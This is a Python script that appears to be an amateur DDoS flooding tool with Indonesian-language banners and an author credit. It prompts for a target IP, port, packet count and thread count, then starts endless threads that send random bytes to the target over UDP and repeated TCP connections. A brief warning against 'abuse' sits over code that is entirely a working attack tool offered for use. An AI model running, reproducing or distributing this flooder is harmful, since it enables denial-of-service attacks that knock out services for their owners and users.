import random
import socket
import threading
import os,sys
import time

os.system("clear")

print("\033[91m")
print("""
██╗███╗░░██╗██████╗░██╗░░░██╗████████╗
██║████╗░██║██╔══██╗██║░░░██║╚══██╔══╝
██║██╔██╗██║██████╔╝██║░░░██║░░░██║░░░
██║██║╚████║██╔═══╝░██║░░░██║░░░██║░░░
██║██║░╚███║██║░░░░░╚██████╔╝░░░██║░░░
╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚═════╝░░░░╚═╝░░░
""")
print("KETIK BAWAH")
print("DDOS-ATTACK")

test = input()
if test == "D":
    exit(5)
os.system("clear")
print("============⚠WARNING⚠︎============")
print("JANGAN DI BUAT ABUSE KALO ABUSE TANGUNG SENDIRI BUKAN NYA GUA NAKUT NAKUTIN ABUSE TANGUNG SENDIRI DDOS BERBAU ILEGAL JADI JANGAN ABUSE TUNGGU 10 DETIK")
print("============⚠WARNING⚠︎============")
time.sleep(10)

os.system("clear")
print ("Autor : Wizzly")
print("""\033[91m
██████╗░██████╗░░█████╗░░██████╗            
██╔══██╗██╔══██╗██╔══██╗██╔════╝            
██║░░██║██║░░██║██║░░██║╚█████╗░            
██║░░██║██║░░██║██║░░██║░╚═══██╗            
██████╔╝██████╔╝╚█████╔╝██████╔╝            
╚═════╝░╚═════╝░░╚════╝░╚═════╝░            

░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
""")
print("\033[0m")

ip = str(input("\033[91m Target Host/Ip:"))
port = int(input("\033[91m Target Port:"))
choice = str(input("\033[91m Gas Ddos? (y/n):"))
times = int(input("\033[91m Packets:"))
threads = int(input("\033[91m Threads:"))
print("APAKAH YAKIN IP INI? IP %s PORT %s"%(ip, port))
choice = str(input("y/n:"))
print("PROSES TUNGGU 5 DETIK")
time.sleep(5)

os.system("clear")
print("\033[91m")
print("LOADING.")
time.sleep(1)
print("LOADING..")
time.sleep(1)
print("LOADING...")
time.sleep(1)
print("LOADING....")
time.sleep(1)
print("LOADING.....")
time.sleep(1)
print("!!!!!!!PROGRAM START!!!!!!!")
time.sleep(4)
print("!!!!!!!LOOCKED IP %s PORT %s!!!!!!!"%(ip, port))
time.sleep(2)
print("!!!!!!!LOOCKED IP TUNGGU 5 DETIK!!!!!!!")
time.sleep(5)
os.system("clear")
def run():
        data = random._urandom(2000)
        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
                except:
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

def run2():
        data = random._urandom(615)
        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

def run3():
        data = random._urandom(20)
        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")


def run4():
        data = random._urandom(16)
        i = random.choice(("\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> ","\033[93m[@] (RELAXS) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91m MEMBANTAI IP \033[0m%s \033[91mMENINDAS PORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
                th = threading.Thread(target = run2)
                th.start()
                th = threading.Thread(target = run3)
                th.start()
        else:
                th = threading.Thread(target = run4)
                th.start()
